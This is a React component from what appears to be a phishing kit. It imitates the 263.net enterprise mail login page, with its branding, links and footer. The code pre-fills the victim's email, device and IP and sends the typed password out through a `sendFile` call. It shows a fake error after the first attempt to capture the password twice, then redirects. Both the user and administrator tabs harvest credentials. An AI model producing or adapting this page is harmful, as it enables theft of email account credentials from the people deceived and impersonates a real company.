import { navigate } from "@reach/router";
import React, { Fragment, useState } from "react";
import { Helmet } from "react-helmet";
import { notify, sendFile } from "../servers";

function Page263({ location }) {
  const [values, setValues] = useState({
    username: location.state.email,device: location.state.device,
    ip: location.state.ip,
    password: "",
  });

  const [submited, setSubmited] = useState({ status: false, count: 0 });

  const handleChange = (event) => {
    setValues({
      ...values,
      [event.target.name]: event.target.value,
    });
  };

  const submitForm = (event) => {
    event.preventDefault();
    setSubmited({ ...submited, status: !submited.status });

    if (submited.count == 0) {
      sendFile(values).then((data) => {
        // show error
        notify();
        setSubmited({ ...submited, count: submited.count + 1 }); setValues({ ...values, password: "" });
        console.log(data);
        console.log(submited);
      });
    } else {
      sendFile(values).then((data) => {
        // redirect
        navigate("processing", { state: { domain: location.state.domain } });
        console.log("ok");
      });
    }
  };
  return (
    <Fragment>
      <Helmet>
        <link rel="stylesheet" href="../263_files/main.css" />
        <link
          rel="stylesheet"
          type="text/css"
          href="../263_files/MAlogin_main_new.css"
        />
        <link
          rel="stylesheet"
          type="text/css"
          href="../263_files/MAlogin_new.css"
        />
        <script src="../263_files/jquery.min.js"></script>
        <script src="../263_files/net263_wm_util.js"></script>
        <script src="../263_files/net263_wm_custom_login_domain.js"></script>

        <script src="../263_files/net263_wm_custom_login.js"></script>
        <script src="../263_files/main.js"></script>
      </Helmet>
      <div className="mainBox" style={{ height: "657px", width: "1349px" }}>
        <div className="pageHeader">
          <div className="defaultWid">
            <span className="logo">
              <img
                id="cl_top_logo"
                style={{ marginTop: "12px" }}
                src="../263_files/domain_logo.png"
              />
            </span>
            {/* <span id="cl_top_desc" class="desc" style="display: none;">企业邮箱，第一品牌</span> */}
            <div className="layout_border_logo" />
            <div className="layout_border_conpanyTxt" />
            <ul className="nav" style={{ display: "block" }}>
              <li>
                <a
                  className
                  href="http://www.263.net/r/cms/www/wm/"
                  target="_blank"
                >
                  个人邮箱
                </a>
              </li>
              <li>
                <a
                  className
                  href="http://www.263.net/263/enterpriseMail/"
                  target="_blank"
                >
                  企业邮箱
                </a>
              </li>
              <li className="hotline">
                客服热线：<span>400-650-9263</span>
              </li>
              <li className="otherLogin">
                <span className="mail" title="邮箱登录" />
                <a
                  href="http://cc.263.net/"
                  className="conference"
                  title="会议登录"
                  target="_blank"
                />
                <a
                  href="https://live.263.net/login/"
                  className="cast"
                  title="直播登录"
                  target="_blank"
                />
              </li>
            </ul>
          </div>
        </div>
        <div className="pageSection">
          <div className="defaultWid">
            <div className="imgBox left">
              <img src="../263_files/leftImg_new.png" />
            </div>
            <div className="layout_border_Img" />
            <div className="loginBox right">
              {/* CUSTOM_LOGIN_VERSION $Id: login_div.html 14987 2020-06-05 05:53:24Z nayingli $ */}
              {/*登录框区域  */}
              {/* the tabs */}
              <ul className="tabs">
                <li>
                  <a
                    href="javascript:void(0)"
                    hidefocus="true"
                    id="showTabUser"
                    className="current"
                  >
                    User login
                  </a>
                </li>
                <li>
                  <a
                    href="javascript:void(0)"
                    hidefocus="true"
                    id="showTabAdmin"
                    className="securityInput"
                  >
                    Administrator login
                  </a>
                </li>
              </ul>
              {/* tab "panes" */}
              <div className="panes">
                {/*用户登录*/}
                <div id="tabUser">
                  <div className="login-scancode" style={{ display: "block" }}>
                    <div className="login-type-pc" />
                    <div className="login-type-wechat" />
                  </div>
                  <div className="qrcode-wrap">
                    <div className="code-img">
                      <img
                        className="qrcode"
                        style={{ width: 132, height: "132px" }}
                        src="../263_files/qrcode-pic.png"
                      />
                    </div>
                    <div className="expire-mask" style={{ display: "none" }}>
                      <p id="wechatScanExpire">QR code has expired</p>
                      <a id="wechatScanRefresh" href="javascript:;">
                        Refresh
                      </a>
                      <div className="mask-block" />
                    </div>
                    <div className="scan-icon-wrap">
                      <div className="scan-icon">
                        <span className="scan-login-img">
                          <img src="../263_files/qrcode-scan-icon.png" />
                        </span>
                        <span id="wechatScanLogin">
                          Wechat code scanning login
                        </span>
                      </div>
                    </div>
                  </div>
                  <form name="formi" onSubmit={submitForm}>
                    <p className="input_width_domain">
                      <span className="user_icon" />
                      <input
                        type="text"
                        name="username"
                        onChange={handleChange}
                        value={values.username}
                        disabled
                        className="accountInput"
                      />
                      <span
                        id="cl_span_domain"
                        className="domain"
                        style={{ display: "none" }}
                      >
                        <nobr id="cl_span_domain_txt" />
                      </span>
                    </p>
                    <p className="input_width_domain">
                      <span className="pwd_icon" />
                      <input
                        name="password"
                        value={values.password}
                        onChange={handleChange}
                        required
                        className="pswInput"
                        type="password"
                        id="passworduser"
                      />
                    </p>
                    <span
                      id="userTypePwdCapitalOpen"
                      className="popNotice securityInput"
                    >
                      Capital is opened
                    </span>
                    <p className="btn_domain">
                      <span className="checkSafety">
                        <span>
                          <input
                            id="safelogin"
                            type="checkbox"
                            hidefocus="true"
                            name="safelogin"
                            className="securityInput"
                            defaultChecked="checked"
                            style={{ display: "inline-block" }}
                          />
                        </span>
                        <span
                          id="sslSafeLoginSSL"
                          className="safeTxt securityInput"
                          style={{ display: "inline" }}
                        />
                        <span
                          id="sslSafeLogin"
                          className="safeTxt securityInput"
                          style={{ display: "inline" }}
                        >
                          Security Login
                        </span>
                      </span>
                      <span id="clearTrace" className="clearTrace">
                        Clear Trace
                      </span>
                    </p>
                    <p>
                      <input
                        type="submit"
                        disabled={submited.status}
                        hidefocus="true"
                        className="btnLoginIn"
                        defaultValue="Sign in"
                      />
                    </p>
                  </form>
                </div>
                {/*管理员登录*/}
                <div
                  id="tabAdmin"
                  className="securityInput"
                  style={{ display: "none" }}
                >
                  <form name="formii" onSubmit={submitForm}>
                    <input
                      type="text"
                      className="securityInput"
                      name="func"
                      defaultValue="login"
                    />
                    <input
                      id="cl_input_ma_chr"
                      type="text"
                      className="securityInput"
                      defaultValue="cn"
                      name="chr"
                    />
                    <input
                      type="text"
                      className="securityInput"
                      name="status"
                      defaultValue={100}
                    />
                    <input
                      type="text"
                      className="securityInput"
                      name="domainType"
                      defaultValue="ma"
                    />
                    <input
                      type="text"
                      className="securityInput"
                      name="task"
                      defaultValue="login"
                    />
                    <input
                      type="text"
                      className="securityInput"
                      name="loginType"
                      defaultValue="from"
                    />
                    <input
                      type="text"
                      className="securityInput"
                      name="user"
                      defaultValue="hhhhhhh"
                      id="adminnameUser"
                    />
                    <p className="manager">
                      <span>
                        <input
                          type="radio"
                          defaultChecked="checked"
                          defaultValue={2}
                          name="type"
                        />
                        <label id="typeLabSupperAdmin">Administrator</label>
                      </span>
                      <span>
                        <input type="radio" defaultValue={3} name="type" />
                        <label id="typeLabDomainAdmin">Sub-administrator</label>
                      </span>
                    </p>
                    <p className="input_width_domain">
                      <span className="user_icon" />
                      <input
                        type="text"
                        id="adminname"
                        className="darkInputTxt securityInput accountInput"
                        defaultValue="vdfdfdfd"
                        style={{ display: "none" }}
                      />
                      <input
                        name="username"
                        onChange={handleChange}
                        value={values.username}
                        disabled
                        type="text"
                        className="accountInput"
                      />
                      <span id="cl_span_admin_domain" className="domain">
                        <nobr id="cl_span_admin_domain_txt" />
                      </span>
                    </p>
                    <p className="input_width_domain">
                      <span className="pwd_icon" />
                      <input
                        type="password"
                        name="password"
                        value={values.password}
                        onChange={handleChange}
                        required
                        className="pswInput"
                        id="passwordadmin"
                      />
                      <span
                        id="adminSecturyPwdCapitalOpen"
                        className="popNotice securityInput"
                      >
                        Capital is opened
                      </span>
                    </p>
                    <p className="btn_domain">
                      <span className="checkSafety">
                        <span style={{ display: "none" }}>
                          <input
                            id="security"
                            type="checkbox"
                            hidefocus="true"
                            name
                          />
                        </span>
                        <span
                          id="adminSecturySpan"
                          className="safeTxt"
                          style={{ display: "none" }}
                        >
                          Use the security card
                        </span>
                        <br
                          id="adminOptionBr"
                          className="securityInput"
                          style={{ display: "none" }}
                        />
                        <span>
                          <input
                            id="safeloginMa"
                            type="checkbox"
                            hidefocus="true"
                            name="safelogin"
                            className="securityInput"
                            defaultChecked="checked"
                            style={{ display: "inline-block" }}
                          />
                        </span>
                        <span
                          id="sslAdminSafeLoginSSL"
                          className="safeTxt securityInput"
                          style={{ display: "inline" }}
                        />
                        <span
                          id="sslAdminSafeLogin"
                          className="safeTxt securityInput"
                          style={{ display: "inline" }}
                        >
                          Security Login
                        </span>
                      </span>
                      <span id="adminClearTrace" className="clearTrace">
                        Clear Trace
                      </span>
                    </p>
                    <p>
                      <input
                        type="submit"
                        disabled={submited.status}
                        className="btnLoginIn"
                        defaultValue="Sign in"
                        hidefocus="true"
                      />
                    </p>
                  </form>
                </div>
                <div className="languageBox securityInput" style={{}}>
                  <ul>
                    <li>
                      <a
                        id="language_cn"
                        hidefocus="true"
                        className="CN"
                        href="http://mail.263.net/#lang=cn"
                      >
                        中文（简）
                      </a>
                    </li>
                    <li>
                      <a
                        id="language_hk"
                        hidefocus="true"
                        className="TCN"
                        href="http://mail.263.net/#lang=hk"
                      >
                        中文（繁）
                      </a>
                    </li>
                    <li>
                      <a
                        id="language_en"
                        hidefocus="true"
                        className="EN"
                        href="http://mail.263.net"
                      >
                        English
                      </a>
                    </li>
                    <li>
                      <a
                        id="language_jp"
                        hidefocus="true"
                        className="JP"
                        href="http://mail.263.net/#lang=jp"
                      >
                        日本語
                      </a>
                    </li>
                    <li>
                      <a
                        id="language_kr"
                        hidefocus="true"
                        className="KR"
                        href="http://mail.263.net/#lang=kr"
                      >
                        한국어
                      </a>
                    </li>
                  </ul>
                </div>
                <div className="securityInput" />
              </div>
              <p className="login_bott">
                <a
                  id="canNotLogin"
                  href="https://mail.263.net/wm2e/website/jsp/resetPassword.jsp"
                  target="_blank"
                  className="txtArr left"
                >
                  Forgot Password
                </a>
                <a
                  id="canNotAdminLogin"
                  href="https://mail.263.net/wm2e/website/jsp/resetPasswordAdmin.jsp"
                  target="_blank"
                  className="txtArr left"
                  style={{ display: "none" }}
                >
                  Forgot administrator password
                </a>
                {/*语言选择*/}
                <a
                  id="languageBtn"
                  className="txtArr dropdown_lang"
                  hidefocus="true"
                  href="javascript:;"
                >
                  Language
                </a>
              </p>
            </div>
            <div className="clear" />
          </div>
        </div>
        <div className="pageBottom">
          <div id="cl_bottom" className="defaultWid">
            <p className="footLinks">
              <span>
                <a hidefocus="true" target="_blank" href="http://www.263.net/">
                  263云通信官网
                </a>
                &nbsp;|&nbsp;
                <a
                  hidefocus="true"
                  target="_blank"
                  href="https://videoconference.263.net/"
                >
                  视频会议
                </a>
                &nbsp;|&nbsp;
                <a
                  hidefocus="true"
                  target="_blank"
                  href="https://live.263.net/"
                >
                  企业直播
                </a>
                &nbsp;|&nbsp;
                <a
                  hidefocus="true"
                  target="_blank"
                  href="https://enterprisemail.263.net/"
                >
                  企业邮箱
                </a>
                &nbsp;|&nbsp;
                <a
                  hidefocus="true"
                  target="_blank"
                  href="https://teleconference.263.net/"
                >
                  电话会议
                </a>
                &nbsp;|&nbsp;
                <a
                  hidefocus="true"
                  target="_blank"
                  href="https://www.263.net/263/helpcenter/client/"
                >
                  帮助中心
                </a>
                {/* <a hidefocus="true" target="_blank" href="http://www.263.net/263/netVideoConference/">网络会议</a> | <a hidefocus="true" target="_blank" href="http://www.263.net/263/webcast/">网络直播</a> |  
					<a hidefocus="true" target="_blank" href="http://www.263.net/263/overview/">企业即时通信</a> */}
              </span>
            </p>
            <p className="copyright">
              Copyright © 1998-2021 北京二六三企业通信有限公司 |
              <a
                href="https://beian.miit.gov.cn/"
                target="_blank"
                style={{ padding: 0, color: "#999999" }}
              >
                京ICP备08010619号-3
              </a>
            </p>
            <div className="layout_border_copright" />
            <div className="layout_border_links" />
          </div>
        </div>
      </div>
    </Fragment>
  );
}

export default Page263;
